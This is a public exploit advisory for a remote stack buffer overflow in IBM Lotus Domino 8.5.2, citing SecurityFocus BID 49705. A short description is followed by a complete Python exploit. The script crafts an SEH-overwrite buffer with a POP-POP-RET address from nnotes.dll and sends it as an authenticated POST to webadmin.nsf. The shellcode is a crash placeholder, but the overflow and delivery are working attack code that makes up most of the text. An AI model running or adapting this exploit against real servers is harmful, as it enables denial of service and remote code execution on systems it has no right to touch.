source: http://www.securityfocus.com/bid/49705/info

IBM Lotus Domino is prone to a remote stack-based buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied input.

Successfully exploiting this issue will allow remote attackers to execute arbitrary code with system-level privileges. Successful exploits will completely compromise affected computers. Failed exploit attempts will result in a denial-of-service condition.

Lotus Domino 8.5.2 is vulnerable; other versions may also be affected. 

#!/usr/bin/python

import socket,struct,sys,os

host="192.168.x.y"					#server ip here!
cookie="1234567890abcdef"	                        #Set your Cookie credential here! Cookie = base64((usr:pwd))
#Shellcode = Using XOR [reg],reg to crash ("like" INT3 :))
Shellcode=chr(0x30)

server=host,80
SEH=struct.pack("<L",0x60404672)                       # POP ESI - POP EBP - RETN nnotes.dll.60404672
nSEH=struct.pack("<L",0x4141347A)                      # INC ecx  ;NOP 
                                                        # INC ecx  ;NOP
 							# JPE  slep ;Detour
vars="__Click=0&tHPRAgentName="                         #tHPRAgentName => Vulnerable POST variable
buf="A"*436                                             #sended buffer-nSEH-SEH
slep="X"*46                                             #pre-shellcode to fix JPE landing

#This function forges our POST request (with our Shellcode sure)
def buildPOST(h,b,c):				
	P="POST /webadmin.nsf/fmHttpPostRequest?OpenForm&Seq=1 HTTP/1.1\r\n"
	P+="Host: "+h+"\r\n"
	P+="User-Agent: oh sure\r\n"
	P+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	P+="Accept-Language: chinnese plz\r\n"
	P+="Accept-Encoding: gzip,deflate\r\n"
	P+="Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
	P+="Keep-Alive: 115\r\n"
	P+="Connection: keep-alive\r\n"
	P+="Referer:  http://"+h+"/webadmin.nsf/dlgConfigPorts?ReadForm&objref=16\r\n"
	P+="Cookie: CWCweb=\"savedLocale:en\"\r\n"
	P+="Authorization: Basic "+c+"\r\n"
	P+="Content-Type: application/x-www-form-urlencoded\r\n"
	P+="Content-Length: %s\r\n" % str(len(b))
	P+="\r\n"
	P+=b
	return P

def main():
	if os.name=="nt":
		os.system("cls")
	else:
		os.system("clear")
	print"\t->[ IBM Lotus Domino 8.5.2 Remote Stack Overflow ]<-"
	print"\t        ->[Remote Code Execution Exploit]<-\n\n"
	print"[+] Crafting buffer..."
	#Creating POST content data
	buffer=vars+buf+nSEH+SEH+slep+Shellcode
	print"[+] Connecting to server..."
	s=socket.socket()
	#Trying connect to IBM Lotus Domino HTTP server
	try:
		s.connect(server)
	#We goin to exit if this fails
	except:
		print"[-] Error connecting to remote server..."
		sys.exit(0)
	print"[+] Crafting POST request..."
	#Crafting final POST
	post=buildPOST(host,buffer,cookie)
	print"[+] 0k, sending..."
	#Sending Shellcode to remote server
	s.send(post)
	#Server is running? Some fails :S
	try:
		print s.recv(2048)
		print"[x] Exploit failed!"
	#Else we achieve remote code execution successfully
	except:
		print"[+] Done!" 
	s.close()
	print"\n[*] By @rmallof"

if __name__=="__main__":
	main()
